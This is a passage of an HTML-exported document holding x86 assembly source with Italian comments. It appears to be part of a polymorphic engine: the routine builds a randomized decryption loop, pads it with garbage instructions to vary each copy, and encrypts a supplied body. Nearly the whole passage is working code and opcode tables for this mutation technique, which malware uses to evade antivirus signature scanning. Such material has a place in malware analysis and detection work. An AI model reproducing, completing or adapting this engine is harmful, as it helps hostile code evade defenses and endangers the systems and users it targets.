color:#CCFFCC'>; controllare se il contatore e' uguale a zero, quindi se la
decrittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; e' finita<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>get_cntrchk:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random_07<span style="mso-spacerun:
yes">         </span>; cinque tipi in tutto<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,04<span style="mso-spacerun:
yes">                   </span>; da 0 a 5 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun: yes">       </span>ja<span
style="mso-spacerun: yes">      </span>get_cntrchk<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>si,offset cntr_checks<span
style="mso-spacerun: yes">   </span>; sulla tabella delle possibili<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>si,ax<span style="mso-spacerun:
yes">                   </span>; variazioni + offset rnd<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     
</span><span style="mso-spacerun: yes"> </span>mov<span style="mso-spacerun:
yes">     </span>ah,byte ptr ds:[si]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>al,083h<span style="mso-spacerun:
yes">                 </span>; prefisso fisso x quel tipo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun:
yes">                                                </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFCC;mso-ansi-language:
EN-US'>; di opcodes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>add<span style="mso-spacerun: yes">     </span>ah,byte ptr
ds:[already_cnt]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun: yes">       </span>stosw<span
style="mso-spacerun: yes">                           </span>; aggiungiamo i bit
in base<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun:
yes">                                                </span>; al counter e
mettiamo in buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; in definitiva risulta una codifica del tipo:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:DE'>; CMP reg16,imm8 – opcode 83h/7, imm8<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:DE'>; XOR reg16,imm8 – opcode 83h/6, imm8<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:DE'>; OR<span style="mso-spacerun: yes"> 
</span>reg16,imm8 – opcode 83h/1, imm8<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:DE'>; SUB reg16,imm8 – opcode 83h/5, imm8<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:DE'>; ADD reg16,imm8 – opcode 83h/0, imm8<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; dove il valore di AH è calcolato sulla base dei valori della
tabella:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>; cntr_checks<span style="mso-spacerun:
yes">  </span>db<span style="mso-spacerun: yes">  </span>0c0h,0c8h,0e8h,0f0h,0f8h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>in<span
style="mso-spacerun: yes">      </span>al,40h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>cl,al<span style="mso-spacerun:
yes">                   </span>; possiamo fare il check<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>xor<span
style="mso-spacerun: yes">     </span>al,al<span style="mso-spacerun:
yes">                   </span>; sia considerando lo 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span><span style="mso-spacerun: yes">     </span>ror<span
style="mso-spacerun: yes">     </span>cl,1<span style="mso-spacerun:
yes">                    </span>; come byte o come word<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jnc<span
style="mso-spacerun: yes">     </span>with_byte<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>sub<span
style="mso-spacerun: yes">     </span>byte ptr ds:[di-2],02h<span
style="mso-spacerun: yes">  </span>; se con word allora cambia<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                                </span>; il byte di
prefisso in 81h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>stosb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>with_byte:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span><span style="mso-spacerun: yes">     </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>stosb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; Crea il jump zero corto che salta il jump lungo che invece
salta al loop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>; del decryptor<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>ax,0374h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>stosw<span style="mso-spacerun: yes">                </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; Crea il jump che salta di nuovo all'inizio del loop di
decryption<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>al,0e9h<span
style="mso-spacerun: yes">         </span><span style="mso-spacerun:
yes">        </span>; opcode jump long<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>stosb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>ax,di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>sub<span style="mso-spacerun: yes">     </span>ax,word ptr
ds:[decr_begin]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>inc<span
style="mso-spacerun: yes">     </span>ax<span style="mso-spacerun:
yes">                      </span>; calcola offset all'inizio<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>inc<span
style="mso-spacerun: yes">     </span>ax<span style="mso-spacerun:
yes">                      </span>; del loop di decrittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:DE'><span style="mso-spacerun: yes">      
</span>neg<span style="mso-spacerun: yes">     </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosw<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; A questo punto tutto quanto e' pronto. viene aggiunto ancora
un po' di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; istruzioni garbage con tutti i registri per migliorare
l'effetto<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">         </span>xor<span
style="mso-spacerun: yes">     </span>ax,ax<span style="mso-spacerun:
yes">                 </span>; pulizia<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">         </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
FR'>dec<span style="mso-spacerun: yes">     </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        
</span>mov<span style="mso-spacerun: yes">     </span>word ptr ds:[already_pnt],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        
</span>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[already_pnt+2],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        
</span>call<span style="mso-spacerun: yes">    </span>random_garbage<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        
</span>mov<span style="mso-spacerun: yes">     </span>bx,0fh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">         </span>call<span
style="mso-spacerun: yes">    </span>garbage<span style="mso-spacerun:
yes">                 </span>; un po' + di garbage x evitare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">         </span>call<span
style="mso-spacerun: yes">    </span>random_garbage<span style="mso-spacerun:
yes">          </span>; problemi di prefetch<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">         </span>mov<span
style="mso-spacerun: yes">     </span>ax,di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">         </span>sub<span
style="mso-spacerun: yes">     </span>ax,bp<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        
</span>mov<span style="mso-spacerun: yes">     </span>si,word ptr
ds:[pointer_ass]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; finiamo l'inizializzazione del pointer al codice crittato<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">         </span>mov<span
style="mso-spacerun: yes">     </span>word ptr ds:[si],ax<span
style="mso-spacerun: yes">     </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Da qui in avanti tutto quello che viene messo su DS:DI sara'
crittato,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; infatti il pointer e' appena stato assegnato sopra<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>push<span
style="mso-spacerun: yes">    </span>di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>random_garbage<span style="mso-spacerun:
yes">          </span>; Anche un po' di garbage<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>ax<span style="mso-spacerun: yes">  
</span><span style="mso-spacerun: yes">                   </span>; crittata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>cx,di<span style="mso-spacerun:
yes">                   </span>; quanti bytes di garbage ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>sub<span
style="mso-spacerun: yes">     </span>cx,ax<span style="mso-spacerun:
yes">                   </span>; crittata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>push<span style="mso-spacerun: yes">    </span>cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>si,word ptr
ds:[counter_ass]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>dx,word ptr ds:[si]<span
style="mso-spacerun: yes">     </span>; aggiorniamo il counter<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>push<span
style="mso-spacerun: yes">    </span>dx<span style="mso-spacerun:
yes">                      </span>; anche con la garbage crittata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>add<span style="mso-spacerun: yes">     </span>dx,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>inc<span style="mso-spacerun: yes">     </span>dx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>and<span
style="mso-spacerun: yes">     </span>dl,0feh<span style="mso-spacerun:
yes">                 </span>; teniamo sempre pari dato<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>word ptr ds:[si],dx<span
style="mso-spacerun: yes">     </span>; che crittiamo words senza<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>cx<span style="mso-spacerun:
yes">                      </span>; fare troppi check<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; DX ha adesso la lunghezza del decryptor + encrypted garbage +
encrypted body<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>si,word ptr ds:[given_si]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>push<span
style="mso-spacerun: yes">    </span>di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>rep<span
style="mso-spacerun: yes">     </span>movsb<span style="mso-spacerun:
yes">                   </span>; copiamo quello che si vuole<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>di<span style="mso-spacerun:
yes">                      </span>; crittare (ricevuto in input<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>ax<span style="mso-spacerun:
yes">                      </span>; come DS:SI)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>sub<span
style="mso-spacerun: yes">     </span>di,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; E infine ci apprestiamo a crittare il tutto. I primi due test
sono fatti<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; per vedere se dobbiamo correggere il puntatore o la chiave in
base alla<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; sequenza nella quale sono state generate le istruzioni
nell'encryption<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; loop.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Dopodiche' verra' eseguito il loop di crittazione, dove
ovviamente le<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; istruzioni attuali verranno rimpiazzate con quelle scelte e
generate nel<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; corso dell'esecuzione del motore polimorfo.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>xor<span
style="mso-spacerun: yes">     </span>ah,ah<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>al,byte ptr ds:[pnt_sba]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>add<span style="mso-spacerun: yes">     </span>di,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>cx,word ptr
ds:[initial_key]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>dec<span style="mso-spacerun: yes">     </span>byte ptr ds:[pre_kdn]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>jnz<span style="mso-spacerun: yes">     </span>encrypt_loop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>pre_chk<span style="mso-spacerun: yes">         </span>db<span
style="mso-spacerun: yes">      </span>90h,90h,90h,90h<span
style="mso-spacerun: yes">         </span>; spazio per il cambio chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                                </span>; iniziale<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>encrypt_loop:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">          </span><span
style="mso-spacerun: yes">      </span>db<span style="mso-spacerun: yes">     
</span>31h,0dh<span style="mso-spacerun: yes">                 </span>; xor
[di],cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>modify_key:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>db<span
style="mso-spacerun: yes">      </span>90h,90h,90h,90h<span
style="mso-spacerun: yes">         </span>; spazio per il cambio chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>inc<span
style="mso-spacerun: yes">     </span>di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>dec<span
style="mso-spacerun: yes">     </span>dx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>inc<span
style="mso-spacerun: yes">     </span>di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
